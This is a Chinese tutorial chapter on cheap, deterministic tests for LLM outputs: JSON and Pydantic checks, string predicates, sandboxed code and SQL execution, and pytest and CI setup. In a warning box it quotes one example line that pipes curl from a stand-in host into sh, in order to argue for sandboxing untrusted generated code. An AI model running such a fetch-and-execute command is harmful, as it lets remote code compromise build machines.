---
title: "LLM 输出的断言与单元测试"
description: "在任何 judge 模型介入之前，每个 LLM 提交都该先过一遍的那些便宜、确定性的检查：schema、contains、regex、代码能跑、SQL 能解析，接进 pytest 和 CI。"
slug: 03-assertions-and-unit-tests
part: 4
chapter: 3
difficulty: beginner
prerequisites:
  - part-2-working-with-model-apis/02-structured-outputs
  - 02-your-first-eval-set
tags: [llm]
date_created: 2026-06-12
date_updated: 2026-06-12
---

# LLM 输出的断言与单元测试

你手上有[上一章](./02-your-first-eval-set.md)做出来的 50 条样例的评测集。下一步看起来显然是：搭一套 LLM-as-judge 流水线，让 GPT-5 给每条输出的有用性、准确性、语气打分。别这么干。

Hamel Husain 和 Shreya Shankar 给 OpenAI、Google、Meta、Microsoft 的两千多名工程师讲过 LLM 评测，他们在 2026 年 1 月的 FAQ 里把这条规则说得很直白：CI 里要“优先用断言或其他确定性检查，而不是 LLM-as-judge 评测器”，因为“CI 测试跑得频繁，每个测试的成本必须仔细掂量。”[^1] 一次 judge 调用花几分钱、跑两秒。乘上 50 条样例、三次重试、一天十次提交，你就造出了一条要跑十分钟、在有人看 PR 之前先烧掉 50 美元的 CI 流水线。更糟的是，judge 自己也是概率性的：干净输出它能给你判挂，坏输出它能放过去，于是你 debug 的是测试而不是代码。

解法是把能抓到回归的最笨、最快的检查先写出来，等这些用尽了再往上加码。这一章讲的就是这个。

## 断言金字塔

在你和回归之间，隔着四类确定性检查。每次提交都按这个顺序跑：

![一座四层的金字塔，代表 LLM 输出检查的分层，最便宜的在底部：格式检查、schema 校验、字符串谓词、执行探测；LLM-as-judge 作为昂贵的最后手段位于金字塔之上](../../../ai-eng/part-4-eval-fundamentals/images/03-assertion-pyramid.png)
*断言金字塔。每往上一层成本更高，抓到的回归类型也不同。LLM-as-judge 坐在金字塔之上；只有当下面没有任何确定性检查能表达你在意的性质时，才升级到它。*

底座几层几乎是免费的。一次 `json.loads` 调用在微秒级返回；一次 Pydantic 校验在毫秒级的低段；一个正则在微秒级；一次沙箱里的 `subprocess.run` 一两秒。整套东西对着 50 条样例的评测集跑，一分钟以内绰绰有余；如果你测的是冻结的输出 fixture，连 API key 都不用。

## 第 1 层：它到底能不能解析？

在检查输出说了什么之前，先检查你能不能读它。生产提示词最常见的单一回归，就是模型决定给你的 JSON 套一段亲切的开场白：`"Here's the data you asked for: {...}"`。`json.loads` 抛异常，下游代码挂掉，而评测根本没接线来抓这个。

这里要在两个断言之间做选择，选错是最容易犯的错误之一：

- `is_json(output)`：*整个*输出能解析成 JSON。当提示词明确写了“只返回 JSON，不要其他文字”时用它。这里失败是个有用的信号：模型又开始聊天了。
- `contains_json(output)`：输出里*某处*存在一个 JSON 对象。当允许有散文包裹时用它，比如结构化答案前面有一段 `<thinking>` 开场。

选那个与你提示词契约一致的做法。搞混了，不是对正确输出莫名失败（对会加散文的模型用 `is_json`），就是悄悄漏掉回归（你想要严格格式合规，却用了 `contains_json`）。[^2]

同样的逻辑适用于 SQL，用 `sqlglot`，它不用连数据库就能解析：

```python
import json
import re
import sqlglot

def assert_is_json(output: str) -> dict:
    try:
        return json.loads(output)
    except json.JSONDecodeError as exc:
        raise AssertionError(f"Output is not valid JSON: {exc}") from exc

def assert_contains_json(output: str) -> dict:
    match = re.search(r"\{[\s\S]*\}", output)
    assert match, "No JSON object found in output"
    return json.loads(match.group(0))

def assert_sql_parses(sql: str, dialect: str = "postgres") -> None:
    try:
        sqlglot.parse_one(sql, dialect=dialect)
    except sqlglot.errors.ParseError as exc:
        raise AssertionError(f"SQL parse error: {exc}") from exc
```

这三个函数能抓住“模型跑偏了”的绝大部分回归，而它们跑完的时间，差不多就是测试运行器打印那个点的时间。

## 第 2 层：它的形状符合代码的预期吗？

JSON 合法是必要条件，不是充分条件。`{"reuslt": "Paris"}` 能干净解析，两行之后就让 `output["result"]` 崩掉。解法是复用你在[结构化输出](../part-2-working-with-model-apis/02-structured-outputs.md)里写的那个 Pydantic 模型，把它当断言用：

```python
from pydantic import BaseModel, ValidationError
from typing import Optional

class CapitalAnswer(BaseModel):
    country: str
    capital: str
    confidence: float
    notes: Optional[str] = None

def assert_matches_schema(data: dict) -> CapitalAnswer:
    try:
        return CapitalAnswer(**data)
    except ValidationError as exc:
        raise AssertionError(f"Schema mismatch:\n{exc}") from exc
```

这里的测试失败会告诉你到底哪个字段错了、它原本是什么类型、模型产出了什么，全在 Pydantic 的错误信息里。这种精确性，正是该用 Pydantic 而不是手搓一长串 `assert "country" in data and isinstance(data["country"], str)` 的全部理由。

即使你已经开了厂商的 Structured Outputs（`strict: true`），这项检查也该跑。有三样东西仍然能穿过语法保证：

- **拒答。** OpenAI 的安全系统触发，`message.parsed` 回来是 `None`；Anthropic 返回纯文本而不是结构化响应。schema 检查会大声报出来。
- **截断。** 响应在对象中间撞上 `max_tokens`，API 就把它手头那截 JSON 片段返回。那个片段未必过得了校验。
- **跨厂商可移植性。** 你哪天换厂商，支持严格模式的只有 OpenAI、Anthropic 和 Gemini 三家，而且各自只强制 schema 的一个子集。客户端校验才是可移植的那份契约。[^3][^4]

对于不值得写一个 Pydantic 类的 schema（一次性的临时形状、从配置文件动态生成的 schema），`jsonschema.validate(data, schema)` 拿一个裸的 JSON Schema dict 干的是同一件事。

## 第 3 层：它说的是对的话（或者从不说错的话）吗？

第三层是字符串谓词：`contains`、`not_contains`、`regex` 之类。它们抓的回归类型和 schema 不同，管的是字段的*内容*，不是形状。有三个地方它们最值钱：

- **必需的信号词。** 分类器输出必须包含 `"APPROVED"` 或 `"DENIED"`。摘要必须包含输入里出现过的那个日期。医疗机器人的回复必须包含免责声明那段字符串。
- **禁止出现的字符串。** 输出绝不能提到竞品名，绝不能带客户的 PII，绝不能以 `"I'm sorry, I can't help"` 开头（这句拒答话术会悄悄拖垮你的转化率）。
- **格式标记。** markdown 报告必须以 `"# "` 开头。邮件回复必须以签名模板结尾。日期字段必须匹配 `\d{4}-\d{2}-\d{2}`。

```python
import re

def assert_contains(output: str, needle: str) -> None:
    assert needle in output, f"Expected {needle!r} in output, got: {output[:200]!r}"

def assert_not_contains(output: str, needle: str) -> None:
    assert needle not in output, f"Forbidden {needle!r} appeared in output"

def assert_regex(output: str, pattern: str) -> None:
    assert re.search(pattern, output), f"Pattern {pattern!r} did not match output"
```

字符串谓词的陷阱是过度指定。`assert "Paris" in output` 看起来是在测模型有没有返回正确的首都。它不是。它测的是模型有没有返回一个*包含*子串 “Paris” 的字符串。输出 `"Lyon, not Paris"` 能过，`"I don't know, but it's not Paris"` 也能过。对于答案空间很小的分类或抽取任务，在 schema 校验之后对抽出来的字段用 `equals`，或者把 `contains` 和一份针对最可能错误答案的 `not_contains` 配对使用。[^1]

`regex` 留给格式真正固定的输出：日期、货币金额、ISBN、你的提示词本该吐出的 `"REF-\d{6}"` 工单号。别拿它去校验散文；你花在维护正则上的时间会比写提示词还多。

## 第 4 层：它真的能跑起来吗？

当 LLM 产出代码或 SQL，唯一诚实的检查就是跑一遍。SQL 解析器确认语法；Python AST 确认它能编译。两者都不会告诉你这个查询取回的行对不对，或者这个函数有没有处理提示词要求的那条边界情况。执行会告诉你。

pytest 里的最小写法，对于来源可信的代码不需要 Docker：

```python
import subprocess
import sys

def assert_code_runs(code: str, expected_stdout: str = "", timeout: int = 5) -> str:
    result = subprocess.run(
        [sys.executable, "-c", code],
        capture_output=True, text=True, timeout=timeout,
    )
    assert result.returncode == 0, (
        f"Code exited {result.returncode}\nstderr:\n{result.stderr}"
    )
    if expected_stdout:
        assert result.stdout.strip() == expected_stdout.strip(), (
            f"stdout mismatch.\nExpected: {expected_stdout!r}\nGot: {result.stdout!r}"
        )
    return result.stdout
```

`timeout=5` 这个参数没得商量。LLM 在边界情况上会生成死循环，没有超时的 CI runner 会一直坐等，直到 GitHub Actions 在六小时标记处把它杀掉。[^5]

> [!WARNING]
> 绝不要在 CI runner 里不加沙箱地跑来自不可信提示词的 LLM 生成代码。一个用户提交的提示词只要能产出 `import os; os.system("curl evil.sh | sh")`，那条命令就会在你的构建机上执行。对于可信的内部提示词，带超时的 `subprocess.run` 就够了。对于任何面向用户的东西，用 Docker 隔离：`epicbox`，配 `python:3.9-alpine`、`cputime: 1`、`memory: 64` MB。[^5]

SQL 这边，从第 1 层的只解析检查往上走一级，就是对着 fixture 数据库执行。起一个内存里的 SQLite，灌一小份已知数据，跑生成的查询，断言结果行符合预期：

```python
import sqlite3

def assert_sql_returns(sql: str, fixture_rows: list[tuple], expected: list[tuple]) -> None:
    conn = sqlite3.connect(":memory:")
    conn.execute("CREATE TABLE users (id INT, name TEXT, age INT)")
    conn.executemany("INSERT INTO users VALUES (?, ?, ?)", fixture_rows)
    actual = conn.execute(sql).fetchall()
    assert actual == expected, f"SQL returned {actual}, expected {expected}"
```

只解析的检查会漏掉这种回归：模型写出语法正确、但 `WHERE` 子句写错的 SQL。执行能抓到。代价是维护 fixture，而对文本转 SQL 的提示词来说，错误行正是真正要紧的那种失败模式，这份代价值得付。

## 把这一整套接进 pytest

你上一章搭的评测集是一串 `{input, expected}` dict。`@pytest.mark.parametrize` 把它变成一条样例一行的测试，通过/失败清楚，失败信息聚焦：

```python
import json
import pytest
from myapp.prompts import call_capital_extractor

GOLDEN = json.loads(open("evals/capitals.json").read())

@pytest.mark.parametrize("case", GOLDEN, ids=lambda c: c["id"])
def test_capital_extractor(case):
    output = call_capital_extractor(case["input"])
    data = assert_is_json(output)
    answer = assert_matches_schema(data)
    assert answer.capital == case["expected"]["capital"]
    assert_not_contains(output, "I cannot")
```

失败时会精确打印出是哪条样例挂了（`test_capital_extractor[case-37]`）、哪个断言触发的、模型的实际输出是什么——要修提示词，或者把这个样例当成新的边界情况加进评测集，你需要的信息都在这里。

CI 你要两个 job，不是一个：

- **快 job（每次提交、每个 PR）。** 对着预先收集好的输出 fixture 文件跑（`evals/outputs/2026-06-12.jsonl`）。没有 API key，没有实时 LLM 调用，不会 flaky。60 秒内跑完。拦 merge 的是它。
- **慢 job（每晚，或合并到 main 时）。** 拿真实模型重跑提示词，刷新 fixture，跑同一批断言，加上你已经升级使用的 LLM-as-judge 检查。抓模型快照更新和厂商行为变化带来的漂移。这里失败就开 issue，但不拦触发它的那个 PR。[^1]

快 job 才是让评测套件变成习惯的东西。如果跑测试要 API key、要花钱、要五分钟，工程师在本地就会跳过，CI 那一跑成了唯一信号。如果它瞬间跑完、零配置，每次提交都会触发，回归在引入后几秒内就浮出来。

## GitHub Actions 骨架

快 job 就是对着 fixture 跑朴素 `pytest`，不需要任何 secret：

```yaml
# .github/workflows/llm-eval.yml
name: LLM Eval (fast)
on: [push, pull_request]
jobs:
  fast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.12" }
      - run: pip install -r requirements.txt
      - run: pytest tests/llm/ -v --tb=short
```

慢 job 加一个调实时 LLM 刷新 fixture 的步骤，用定时或手动触发来把关：

```yaml
  slow:
    if: github.event_name == 'schedule' || github.event_name == 'workflow_dispatch'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.12" }
      - run: pip install -r requirements.txt
      - run: python scripts/refresh_fixture.py
        env: { OPENAI_API_KEY: ${{ secrets.OPENAI_API_KEY }} }
      - run: pytest tests/llm/ -v
```

Part 4 项目的 CI 故事就这么多。没有 DeepEval，没有 promptfoo，没有评测平台；只有 pytest、Pydantic，和上面那几个断言助手。等朴素 pytest 装不下你的需求了，再升级到托管评测平台也不迟，但大多数团队一辈子都没走到那一步。

## 确定性检查的边界在哪

金字塔抓的是那些能表达成“输出必须（不）包含 X”或“必须（不）能解析成 Y”的回归。有一类它抓不到：答案语法完美、schema 合法、每个必需的信号词都在，但仍然是错的：

- 摘要准确，但漏掉了最重要的那一点。
- 语气正确，但居高临下。
- 代码能跑，但提示词要的是 O(n log n)，它给的是 O(n²)。
- 译文流畅，但丢了原意。

这些就是 [LLM-as-judge](../../../ai-eng/part-8-evaluation-and-observability/01-llm-as-judge.md) 被造出来要解决的失败模式。顺序很重要：确定性断言先跑，每次提交都跑，几秒钟出结果。judge 指标异步跑，跑在抽样的生产流量上，并且有自己的一套评测集，用来证明 judge 和人的判断一致。把两者混进 CI，你的周五下午就会花在 debug 到底哪一层 flaky 上。

放到架构尺度上看，[评测与可观测性流水线](../../hld/part-9-ai-ml-system-design/05-llm-evaluation-observability.md)讲了这些断言失败如何变成生产指标、告警阈值和 trace 采样。

## 参考文献

[^1]: Hamel Husain and Shreya Shankar, "LLM Evals: Everything You Need to Know", hamel.dev, January 15, 2026, https://hamel.dev/blog/posts/evals-faq/
[^2]: promptfoo, "Deterministic Metrics for LLM Output Validation", promptfoo.dev, last updated June 11, 2026, https://promptfoo.dev/docs/configuration/expected-outputs/deterministic
[^3]: OpenAI, "Structured model outputs", OpenAI Platform Docs, accessed June 2026, https://platform.openai.com/docs/guides/structured-outputs
[^4]: Aviad Rozenhek, "How to Fix OpenAI Structured Outputs Breaking Your Pydantic Models", Medium, August 2025, https://medium.com/@aviadr1/how-to-fix-openai-structured-outputs-breaking-your-pydantic-models-bdcd896d43bd
[^5]: promptfoo, "Sandboxed Evaluations of LLM-Generated Code", promptfoo.dev, last updated June 11, 2026, https://www.promptfoo.dev/docs/guides/sandboxed-code-evals/

